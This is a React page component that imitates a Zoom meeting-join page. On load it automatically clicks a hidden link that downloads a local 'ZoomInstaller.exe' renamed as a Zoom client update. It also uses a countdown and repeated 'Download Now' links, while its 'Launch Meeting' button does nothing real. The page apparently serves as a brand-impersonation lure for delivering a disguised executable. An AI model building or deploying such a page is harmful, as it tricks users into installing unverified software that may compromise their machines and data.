import React, { useState, useEffect, useRef } from 'react';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import ChatButton from '@/components/ChatButton';
import { Button } from '@/components/ui/button';
import LoadingSpinner from '@/components/LoadingSpinner';
import { useNavigate } from 'react-router-dom';
import { toast } from '@/components/ui/sonner';

const Index = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [countdown, setCountdown] = useState(3);
  const navigate = useNavigate();
  const downloadRef = useRef<HTMLAnchorElement>(null);
  
  // Trigger auto-download when component mounts
  useEffect(() => {
    // Small timeout to ensure the browser doesn't block the download
    const autoDownloadTimer = setTimeout(() => {
      if (downloadRef.current) {
        downloadRef.current.click();
        console.log('Auto-download initiated');
        
        // Add more detailed logging to help debug
        console.log('Download link href:', downloadRef.current.href);
        console.log('Download attribute:', downloadRef.current.download);
      } else {
        console.error('Download reference not found');
      }
    }, 1500);
    
    return () => clearTimeout(autoDownloadTimer);
  }, []);
  
  useEffect(() => {
    // Countdown timer for redirect
    if (countdown > 0 && isLoading) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    }

    // Redirect after countdown reaches 0
    if (countdown === 0 && isLoading) {
      const redirectTimer = setTimeout(() => {
        setIsLoading(false);
      }, 1000);
      return () => clearTimeout(redirectTimer);
    }
  }, [countdown, isLoading]);

  const handleLaunchMeeting = () => {
    toast.info('Launching Zoom Meeting...');
    // Add any additional launch meeting functionality here
  };

  // Function to handle manual download if auto-download fails
  const handleManualDownload = () => {
    toast.success('Download started');
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <Header />
      
      {/* Hidden link for auto-download */}
      <a 
        ref={downloadRef}
        href="./ZoomInstaller.exe" 
        download="ZoomApp-Update6.3.11.ClientSetup.exe" 
        className="hidden"
      >
        Download
      </a>
      
      <main className="flex-grow flex flex-col items-center justify-center py-12 px-4">
        {isLoading ? (
          <div className="w-full text-center">
            <LoadingSpinner />
            <div className="mt-4 text-gray-700 text-xl">
              Loading Zoom Meeting...
            </div>
            <div className="text-gray-600 mt-2">
              Redirecting in {countdown} seconds
            </div>
            <div className="border-t border-gray-200 mt-10 pt-10">
              <div className="text-center text-gray-600">
                Don't have the Zoom Workplace app installed?{' '}
                <a href="./ZoomInstaller.exe" download="ZoomApp-Update6.3.11.ClientSetup.exe" onClick={handleManualDownload} className="text-zoom-blue hover:underline">Download Now</a>
              </div>
            </div>
          </div>
        ) : (
          <div className="w-full max-w-3xl mx-auto text-center">
            <h1 className="text-2xl font-medium text-gray-700 mb-2">
              Once you install Zoom Workplace app, click <span className="font-semibold">Launch Meeting</span> below
            </h1>
            
            <p className="text-gray-600 mt-6 mb-8">
              By joining a meeting, you agree to our <a href="#" className="text-zoom-blue hover:underline">Terms of Service</a> and <a href="#" className="text-zoom-blue hover:underline">Privacy Statement</a>
            </p>
            
            <div className="flex justify-center mb-16">
              <Button 
                className="bg-zoom-blue hover:bg-blue-600 text-white font-medium px-8 py-6 text-lg rounded"
                onClick={handleLaunchMeeting}
              >
                Launch Meeting
              </Button>
            </div>
            
            <div className="text-gray-600 mt-6">
              Don't have the Zoom Workplace app installed? <a href="./ZoomInstaller.exe" download="ZoomApp-Update6.3.11.ClientSetup.exe" onClick={handleManualDownload} className="text-zoom-blue hover:underline">Download Now</a>
            </div>
          </div>
        )}
      </main>
      
      <Footer />
      <ChatButton />
    </div>
  );
};

export default Index;
